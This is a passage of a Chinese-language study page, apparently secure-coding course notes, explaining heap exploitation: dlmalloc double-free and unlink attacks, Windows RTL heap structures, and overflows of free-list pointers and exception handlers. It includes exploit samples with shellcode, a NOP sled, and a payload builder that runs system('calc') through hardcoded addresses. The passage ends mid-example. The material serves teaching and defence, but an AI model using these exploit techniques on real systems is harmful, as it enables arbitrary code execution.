+<a id="__codelineno-11-27" name="__codelineno-11-27"></a><a href="#__codelineno-11-27"><span class="linenos" data-linenos="27 "></span></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-11-28" name="__codelineno-11-28"></a><a href="#__codelineno-11-28"><span class="linenos" data-linenos="28 "></span></a><span class="p">}</span><span class="w"></span>
+</code></pre></div>
+<ol>
+<li>利用方式的目标是分配的<code>first</code>块</li>
+<li>对<code>second</code>和<code>fourth</code>块的分配，可以阻止<code>third</code>块与<code>first</code>块合并</li>
+<li>当<code>first</code>块在初次释放时，会被放入缓存筐而不是普通的筐</li>
+<li>释放<code>third</code>块将<code>first</code>块移到普通筐</li>
+<li>分配<code>fifth</code>块会造成内存从<code>third</code>块处分开，作为一个副作用，还会导致<code>first</code>块被转移到一个普通筐中</li>
+<li>内存已经配置成功，因此对<code>first</code>的第二次释放构成双重释放漏洞</li>
+<li>分配<code>sixth</code>块时，<code>malloc()</code>返回的指针与<code>first</code>所指向的内存块相同</li>
+<li><code>strcpy()</code>函数的GOT地址（减去12）以及shellcode位置被复制到这块内存</li>
+<li>相同的内存块被再一次分配给<code>seventh</code>块</li>
+<li>当内存块被分配后，<code>unlink</code>宏将shellcode的地址复制到全局偏移表中<code>strcpy</code>的地址处</li>
+<li>调用<code>strcpy()</code>时，程序的控制权被转移到shellcode中。shellcode跳过最初的<code>12</code>个字节，因为这部分内存的一些已经被<code>unlink</code>宏所覆写。</li>
+</ol>
+</li>
+</ul>
+<div class="admonition warning">
+<p>对于以上代码，假如注释了第二次<code>free(first)</code>操作，不会有双重释放问题，但是仍然导致调用<code>strcpy</code>后进入shellcode的控制内，因为写入了<code>first</code>，对<code>malloc()</code>的调用以shellcode的地址取代了<code>strcpy()</code>的地址。</p>
+</div>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="rtlrun-time-library">RTL（Run Time Library）堆<a class="headerlink" href="#rtlrun-time-library" title="Permanent link">&para;</a></h2>
+<h3 id="windows">Windows内存管理<a class="headerlink" href="#windows" title="Permanent link">&para;</a></h3>
+<ul>
+<li>虚拟内存API<ul>
+<li>32位地址，4KB页</li>
+</ul>
+</li>
+<li>堆内存API<ul>
+<li>允许用户建立多个动态堆，每一个进程都有一个默认堆</li>
+</ul>
+</li>
+<li>局部内存API和全局内存API</li>
+<li>CRT内存函数</li>
+<li>内存映射文件API<ul>
+<li>内存映射文件允许一个应用程序将其虚拟地址空间直接映射到磁盘上的一个文件</li>
+</ul>
+</li>
+</ul>
+<h3 id="rtl">RTL 数据结构<a class="headerlink" href="#rtl" title="Permanent link">&para;</a></h3>
+<ul>
+<li>进程环境块<ul>
+<li>PEB维护有每一个进程的全局变量</li>
+<li>PEB被每一个进程的线程环境块（thread environment block, TEB）所引用</li>
+<li>TEB 则被fs寄存器所引用</li>
+<li>版本早于Windows XP SP2的操作系统中，PEB在<code>0x7FFDF000</code>上</li>
+<li>PEB给出堆数据结构的信息:<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> 堆的最大数量</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> 堆的实际数量</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> 默认堆的位置</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> 一个指向包含所有堆位置的数组的指针</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>空闲链表、look-aside链表<ul>
+<li>空闲列表<ul>
+<li>是有128个双向链表的数组，位于堆起始（也就是调用<code>HeapCreate()</code>返回的地址）偏移<code>0x178</code>处</li>
+<li><code>Freelist[]</code>是一个<code>LIST_ENTRY</code>结构（定义于<code>winnt.h</code>中）的数组，由前向链接(flink)和后向(blink)链接组成</li>
+<li>页中未作为第一个内存块的一部分而分配出去的内存，以及那些没有被用作堆控制结构的内存，就被加入空闲列表，对于较小的分配（指的是小于1472字节），大于1024的被加入到<code>Freelist[0]</code>中，假设空间足够的话，后续的分配都从这个空闲块中进行</li>
+</ul>
+</li>
+<li>后备缓存（look-aside）列表<ul>
+<li>加速对小块内存的分配操作（&lt;1016字节）</li>
+<li>先于空闲链表被检查</li>
+</ul>
+</li>
+<li>
+<p>边界标志
+    <figure markdown>
+    <img alt="块边界结构" src="md-img/20191021_08.png" />
+    <figcaption>块边界结构</figcaption>
+    </figure></p>
+<ul>
+<li>自身大小</li>
+<li>前一块大小</li>
+<li>busy标志位</li>
+<li>当块被释放时：<ol>
+<li>边界标志仍然存在</li>
+<li>空闲内存包含下一块和上一块地址</li>
+<li>busy标志位被清空</li>
+</ol>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="_6">基于堆的缓冲区溢出攻击<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h4>
+<ul>
+<li>
+<p>改写双链表结构中的前向和后向指针</p>
+<div class="highlight"><span class="filename">C</span><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1"></a><a href="#__codelineno-12-1"><span class="linenos" data-linenos=" 1 "></span></a><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">shellcode</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;</span><span class="se">\x90\x90\x90\x90</span><span class="s">&quot;</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-12-2" name="__codelineno-12-2"></a><a href="#__codelineno-12-2"><span class="linenos" data-linenos=" 2 "></span></a><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">malArg</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;0123456789012345&quot;</span><span class="w"></span>
+<a id="__codelineno-12-3" name="__codelineno-12-3"></a><a href="#__codelineno-12-3"><span class="linenos" data-linenos=" 3 "></span></a><span class="w">            </span><span class="s">&quot;</span><span class="se">\x05\x00\x03\x00\x00\x00\x08\x00</span><span class="s">&quot;</span><span class="w">       </span>
+<a id="__codelineno-12-4" name="__codelineno-12-4"></a><a href="#__codelineno-12-4"><span class="linenos" data-linenos=" 4 "></span></a><span class="w">            </span><span class="s">&quot;</span><span class="se">\xb8\xf5\x12\x00\x40\x90\x40\x00</span><span class="s">&quot;</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-12-5" name="__codelineno-12-5"></a><a href="#__codelineno-12-5"><span class="linenos" data-linenos=" 5 "></span></a><span class="kt">void</span><span class="w"> </span><span class="nf">mem</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-12-6" name="__codelineno-12-6"></a><a href="#__codelineno-12-6"><span class="linenos" data-linenos=" 6 "></span></a><span class="w">    </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">hp</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-12-7" name="__codelineno-12-7"></a><a href="#__codelineno-12-7"><span class="linenos" data-linenos=" 7 "></span></a><span class="w">    </span><span class="n">HLOCAL</span><span class="w"> </span><span class="n">h1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">h2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">h3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">h4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-12-8" name="__codelineno-12-8"></a><span class="hll"><a href="#__codelineno-12-8"><span class="linenos" data-linenos=" 8 "></span></a><span class="w">    </span><span class="n">hp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">HeapCreate</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mh">0x1000</span><span class="p">,</span><span class="w"> </span><span class="mh">0x10000</span><span class="p">);</span><span class="w"></span>
+</span><a id="__codelineno-12-9" name="__codelineno-12-9"></a><span class="hll"><a href="#__codelineno-12-9"><span class="linenos" data-linenos=" 9 "></span></a><span class="w">    </span><span class="n">h1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">hp</span><span class="p">,</span><span class="w"> </span><span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="p">);</span><span class="w"></span>
+</span><a id="__codelineno-12-10" name="__codelineno-12-10"></a><span class="hll"><a href="#__codelineno-12-10"><span class="linenos" data-linenos="10 "></span></a><span class="w">    </span><span class="n">h2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">hp</span><span class="p">,</span><span class="w"> </span><span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span><span class="w"> </span><span class="mi">128</span><span class="p">);</span><span class="w"></span>
+</span><a id="__codelineno-12-11" name="__codelineno-12-11"></a><span class="hll"><a href="#__codelineno-12-11"><span class="linenos" data-linenos="11 "></span></a><span class="w">    </span><span class="n">h3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">hp</span><span class="p">,</span><span class="w"> </span><span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="p">);</span><span class="w"></span>
+</span><a id="__codelineno-12-12" name="__codelineno-12-12"></a><span class="hll"><a href="#__codelineno-12-12"><span class="linenos" data-linenos="12 "></span></a><span class="w">    </span><span class="n">HeapFree</span><span class="p">(</span><span class="n">hp</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">h2</span><span class="p">);</span><span class="w"> </span><span class="cm">/* (1) */</span><span class="w"></span>
+</span><a id="__codelineno-12-13" name="__codelineno-12-13"></a><a href="#__codelineno-12-13"><span class="linenos" data-linenos="13 "></span></a><span class="w">    </span><span class="n">memcpy</span><span class="p">(</span><span class="n">h1</span><span class="p">,</span><span class="w"> </span><span class="n">malArg</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="p">);</span><span class="w">     </span><span class="c1">// (2)</span>
+<a id="__codelineno-12-14" name="__codelineno-12-14"></a><span class="hll"><a href="#__codelineno-12-14"><span class="linenos" data-linenos="14 "></span></a><span class="w">    </span><span class="n">h4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">hp</span><span class="p">,</span><span class="w"> </span><span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span><span class="w"> </span><span class="mi">128</span><span class="p">);</span><span class="w"> </span><span class="c1">// (3)</span>
+</span><a id="__codelineno-12-15" name="__codelineno-12-15"></a><a href="#__codelineno-12-15"><span class="linenos" data-linenos="15 "></span></a><span class="w">    </span><span class="cm">/* (4) */</span><span class="w"></span>
+<a id="__codelineno-12-16" name="__codelineno-12-16"></a><a href="#__codelineno-12-16"><span class="linenos" data-linenos="16 "></span></a><span class="w">    </span><span class="k">return</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-12-17" name="__codelineno-12-17"></a><a href="#__codelineno-12-17"><span class="linenos" data-linenos="17 "></span></a><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-12-18" name="__codelineno-12-18"></a><a href="#__codelineno-12-18"><span class="linenos" data-linenos="18 "></span></a><span class="kt">int</span><span class="w"> </span><span class="nf">_tmain</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="n">_TCHAR</span><span class="o">*</span><span class="w"> </span><span class="n">argv</span><span class="p">[])</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-12-19" name="__codelineno-12-19"></a><a href="#__codelineno-12-19"><span class="linenos" data-linenos="19 "></span></a><span class="w">    </span><span class="n">mem</span><span class="p">();</span><span class="w"></span>
+<a id="__codelineno-12-20" name="__codelineno-12-20"></a><a href="#__codelineno-12-20"><span class="linenos" data-linenos="20 "></span></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w">    </span><span class="c1">// (5)</span>
+<a id="__codelineno-12-21" name="__codelineno-12-21"></a><a href="#__codelineno-12-21"><span class="linenos" data-linenos="21 "></span></a><span class="p">}</span><span class="w"></span>
+</code></pre></div>
+<ol>
+<li>释放<code>h2</code>导致在已分配内存中打开了一个缺口</li>
+<li>缓冲区溢出</li>
+<li>引发返回地址被shellcode地址覆写</li>
+<li>对<code>HeapAlloc()</code>的调用会导致shellcode的起始4个字节被返回地址<code>\xb8\xf5\x12\x00</code>所覆盖，地址需要可被执行！</li>
+<li>控制转移到shellcode</li>
+</ol>
+</li>
+<li>
+<p>通过覆写异常处理器地址获取控制，引发异常</p>
+<div class="highlight"><span class="filename">vuln.c</span><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="kt">int</span><span class="w"> </span><span class="nf">mem</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">buf</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="w">    </span><span class="n">HLOCAL</span><span class="w"> </span><span class="n">h1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">h2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="w">    </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">hp</span><span class="p">;</span><span class="w">         </span>
+<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="w">    </span><span class="n">hp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">HeapCreate</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mh">0x1000</span><span class="p">,</span><span class="w"> </span><span class="mh">0x10000</span><span class="p">);</span><span class="w">    </span><span class="c1">// (1)</span>
+<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">hp</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a><span class="w">    </span><span class="n">h1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">hp</span><span class="p">,</span><span class="w"> </span><span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span><span class="w"> </span><span class="mi">260</span><span class="p">);</span><span class="w"> </span><span class="cm">/* (2) */</span><span class="w"></span>
+<a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a><span class="w">    </span><span class="n">strcpy</span><span class="p">((</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">h1</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">);</span><span class="w"> </span><span class="c1">// (3)</span>
+<a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a><span class="w">    </span><span class="cm">/* (4) */</span><span class="w"></span>
+<a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a><span class="w">    </span><span class="n">h2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">hp</span><span class="p">,</span><span class="w"> </span><span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span><span class="w"> </span><span class="mi">260</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;we never get here&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-13-13" name="__codelineno-13-13" href="#__codelineno-13-13"></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">argv</span><span class="p">[])</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-13-14" name="__codelineno-13-14" href="#__codelineno-13-14"></a><span class="w">    </span><span class="n">HMODULE</span><span class="w"> </span><span class="n">l</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-13-15" name="__codelineno-13-15" href="#__codelineno-13-15"></a><span class="w">    </span><span class="n">l</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LoadLibrary</span><span class="p">(</span><span class="s">&quot;wmvcore.dll&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-13-16" name="__codelineno-13-16" href="#__codelineno-13-16"></a><span class="w">    </span><span class="n">buildMalArg</span><span class="p">();</span><span class="w"></span>
+<a id="__codelineno-13-17" name="__codelineno-13-17" href="#__codelineno-13-17"></a><span class="w">    </span><span class="n">mem</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-13-18" name="__codelineno-13-18" href="#__codelineno-13-18"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-13-19" name="__codelineno-13-19" href="#__codelineno-13-19"></a><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-13-20" name="__codelineno-13-20" href="#__codelineno-13-20"></a><span class="cm">/* (5) */</span><span class="w"></span>
+<a id="__codelineno-13-21" name="__codelineno-13-21" href="#__codelineno-13-21"></a><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">1000</span><span class="p">]</span><span class="o">=</span><span class="s">&quot;&quot;</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-13-22" name="__codelineno-13-22" href="#__codelineno-13-22"></a><span class="kt">void</span><span class="w"> </span><span class="nf">buildMalArg</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-13-23" name="__codelineno-13-23" href="#__codelineno-13-23"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-13-24" name="__codelineno-13-24" href="#__codelineno-13-24"></a><span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">systemAddr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-13-25" name="__codelineno-13-25" href="#__codelineno-13-25"></a><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">tmp</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span><span class="o">=</span><span class="s">&quot;&quot;</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-13-26" name="__codelineno-13-26" href="#__codelineno-13-26"></a><span class="w">    </span><span class="n">systemAddr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">GetAddress</span><span class="p">(</span><span class="s">&quot;msvcrt.dll&quot;</span><span class="p">,</span><span class="s">&quot;system&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-13-27" name="__codelineno-13-27" href="#__codelineno-13-27"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">66</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="n">strcat</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;DDDD&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-13-28" name="__codelineno-13-28" href="#__codelineno-13-28"></a><span class="w">    </span><span class="n">strcat</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;</span><span class="se">\xeb\x14</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-13-29" name="__codelineno-13-29" href="#__codelineno-13-29"></a><span class="w">    </span><span class="n">strcat</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;</span><span class="se">\x44\x44\x44\x44\x44\x44</span><span class="s">&quot;</span><span class="p">);</span><span class="w"> </span><span class="cm">/* (6) */</span><span class="w"></span>
+<a id="__codelineno-13-30" name="__codelineno-13-30" href="#__codelineno-13-30"></a><span class="w">    </span><span class="n">strcat</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;</span><span class="se">\x73\x68\x68\x08</span><span class="s">&quot;</span><span class="p">);</span><span class="w"> </span><span class="cm">/* (7) */</span><span class="w"></span>
+<a id="__codelineno-13-31" name="__codelineno-13-31" href="#__codelineno-13-31"></a><span class="w">    </span><span class="n">strcat</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;</span><span class="se">\x4c\x04\x5d\x7c</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-13-32" name="__codelineno-13-32" href="#__codelineno-13-32"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">21</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="n">strcat</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-13-33" name="__codelineno-13-33" href="#__codelineno-13-33"></a><span class="w">    </span><span class="n">strcat</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;</span><span class="se">\x33\xC0\x50\x68\x63\x61\x6C\x63\x54\x5B\x50\x53\xB9</span><span class="s">&quot;</span><span class="p">);</span><span class="w"> </span><span class="cm">/* (8) */</span><span class="w"></span>
+<a id="__codelineno-13-34" name="__codelineno-13-34" href="#__codelineno-13-34"></a><span class="w">    </span><span class="n">fixupaddresses</span><span class="p">(</span><span class="n">tmp</span><span class="p">,</span><span class="w"> </span><span class="n">systemAddr</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-13-35" name="__codelineno-13-35" href="#__codelineno-13-35"></a><span class="w">    </span><span class="n">strcat</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="n">tmp</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-13-36" name="__codelineno-13-36" href="#__codelineno-13-36"></a><span class="w">    </span><span class="n">strcat</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="s">&quot;</span><span class="se">\xFF\xD1\x90\x90</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-13-37" name="__codelineno-13-37" href="#__codelineno-13-37"></a><span class="w">    </span><span class="k">return</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-13-38" name="__codelineno-13-38" href="#__codelineno-13-38"></a><span class="p">}</span><span class="w"></span>
+</code></pre></div>
+<ol>
+<li>创建堆</li>
+<li>分配了一个单独的内存块堆，包括：段头、为<code>h1</code>所分配的内存、段尾</li>
+<li>overflowed here</li>
+<li>覆写段尾，包括 <code>LIST_Entry</code> 结构，指针很可能在下一个对RtlHeap的调用时被引用——这会触发一个异常</li>
+<li>可被用于构造恶意参数从而对<code>mem()</code>函数中的漏洞发动攻击的代码，实现漏洞利用的函数例子之一</li>
+<li>改写了尾随空闲块的前向和后向指针</li>
+<li>前向指针被控制权将要转移到的地址所取代</li>
+<li>后向指针则被将要被覆写的内存地址所取代</li>
+</ol>
+<div class="highlight"><span class="filename">将要利用的异常管理器的汇编语句</span><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="c1">; (1)</span>
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="nf">mov</span><span class="w">  </span><span class="no">ecx</span><span class="p">,</span><span class="w"> </span><span class="no">dword</span><span class="w"> </span><span class="no">ptr</span><span class="w"> </span><span class="p">[</span><span class="no">esp</span><span class="err">+</span><span class="mi">4</span><span class="p">]</span><span class="w"></span>
+<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="nf">mov</span><span class="w">  </span><span class="no">eax</span><span class="p">,</span><span class="w"> </span><span class="no">dword</span><span class="w"> </span><span class="no">ptr</span><span class="w"> </span><span class="no">ds</span><span class="p">:[</span><span class="mi">7</span><span class="no">C5D044Ch</span><span class="p">]</span><span class="w"></span>
+<a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="nf">mov</span><span class="w">  </span><span class="no">dword</span><span class="w"> </span><span class="no">ptr</span><span class="w"> </span><span class="no">ds</span><span class="p">:[</span><span class="mi">7</span><span class="no">C5D044Ch</span><span class="p">],</span><span class="w"> </span><span class="no">ecx</span><span class="w"></span>
+<a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="nf">ret</span><span class="w">  </span><span class="mi">4</span><span class="w"></span>
+<a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a><span class="c1">; (2)</span>
+</code></pre></div>
+<ol>
+<li><code>SetUnhandledExceptionFilter(myTopLevelFilter)</code></li>
+<li>前向指针 addr ← shellcode addr 攻击者可以采用跳板</li>
+</ol>
+</li>
+</ul>
+<h4 id="_7">可能存在的漏洞<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h4>
+<ul>
+<li>
+<p>写入已释放内存</p>
+<div class="highlight"><span class="filename">C</span><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1"></a><a href="#__codelineno-15-1"><span class="linenos" data-linenos=" 1 "></span></a><span class="k">typedef</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">_unalloc</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-15-2" name="__codelineno-15-2"></a><a href="#__codelineno-15-2"><span class="linenos" data-linenos=" 2 "></span></a><span class="w">    </span><span class="n">PVOID</span><span class="w"> </span><span class="n">fp</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-15-3" name="__codelineno-15-3"></a><a href="#__codelineno-15-3"><span class="linenos" data-linenos=" 3 "></span></a><span class="w">    </span><span class="n">PVOID</span><span class="w"> </span><span class="n">bp</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-15-4" name="__codelineno-15-4"></a><a href="#__codelineno-15-4"><span class="linenos" data-linenos=" 4 "></span></a><span class="p">}</span><span class="w"> </span><span class="n">unalloc</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">Punalloc</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-15-5" name="__codelineno-15-5"></a><a href="#__codelineno-15-5"><span class="linenos" data-linenos=" 5 "></span></a><span class="kt">char</span><span class="w"> </span><span class="n">shellcode</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;</span><span class="se">\x90\x90\x90\xb0\x06\x90\x90</span><span class="s">&quot;</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-15-6" name="__codelineno-15-6"></a><a href="#__codelineno-15-6"><span class="linenos" data-linenos=" 6 "></span></a><span class="kt">int</span><span class="w"> </span><span class="nf">_tmain</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="n">_TCHAR</span><span class="o">*</span><span class="w"> </span><span class="n">argv</span><span class="p">[])</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-15-7" name="__codelineno-15-7"></a><a href="#__codelineno-15-7"><span class="linenos" data-linenos=" 7 "></span></a><span class="w">    </span><span class="n">Punalloc</span><span class="w"> </span><span class="n">h1</span><span class="p">;</span><span class="w"></span>
